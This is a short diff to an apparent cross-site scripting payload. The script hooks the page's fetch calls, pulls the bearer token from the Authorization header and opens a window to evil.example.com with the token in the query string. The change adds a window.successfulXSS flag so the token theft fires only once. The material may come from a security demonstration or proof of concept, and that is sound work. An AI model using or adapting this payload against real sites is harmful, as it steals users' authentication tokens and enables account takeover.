@@ -1,4 +1,4 @@
-let success = false
+
 
 function install() {
   console.log('installing proxy…')
@@ -9,7 +9,7 @@ function install() {
     	const token = authHeader?.split(' ').at(1)
     	if (token && !success) {
     	  const evilUrl = `https://evil.example.com/?token=${token}`
-        success = true
+        window.successfulXSS = true
     	  window.open(evilUrl, '_blank').focus();
     	}
   				
@@ -20,4 +20,7 @@ function install() {
   console.log('installed fetch proxy in top window')
 }
 
-install()
+if (!window.successfulXSS) { 
+  install()
+}
+
